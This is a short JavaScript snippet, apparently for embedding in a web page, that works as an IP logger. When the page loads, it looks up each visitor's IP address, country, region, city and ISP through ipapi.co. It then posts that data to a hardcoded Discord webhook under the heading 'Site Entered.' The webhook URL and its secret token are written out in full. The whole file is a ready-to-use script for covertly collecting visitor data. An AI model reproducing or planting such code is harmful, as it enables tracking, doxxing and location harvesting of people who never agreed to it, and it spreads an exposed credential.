var request = new XMLHttpRequest();
request.open("POST", "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB");
request.setRequestHeader('Content-type', 'application/json');

fetch("https://ipapi.co/json/")
    .then(response => response.json())
    .then(json => {
        const ip = json.ip;
        const version = json.version;
        const country = json.country_name;
        const region = json.region;
        const org = json.org;
        const city = json.city;

        document.getElementById("IP").innerHTML = ip;
        document.getElementById("version").innerHTML = version;
        document.getElementById("country_name").innerHTML = country;
        document.getElementById("region").innerHTML = region;
        document.getElementById("org").innerHTML = org;
        document.getElementById("city").innerHTML = city;

        var Embed = {
            author: {
                name: "Webhook"
            },
            title: "Site Entered.",
            description: `IP - ${ip}\n\nVersion - ${version}\n\nCountry - ${country}\n\nRegion - ${region}\n\nISP - ${org}\n\nCity - ${city}`,
            color: hexToDecimal("#000000")
        }

        var params = {
            username: "Webhook",
            embeds: [Embed]
        }
        request.send(JSON.stringify(params))

        function hexToDecimal(hex) {
            return parseInt(hex.replace("#", ""), 16)
        }
    })
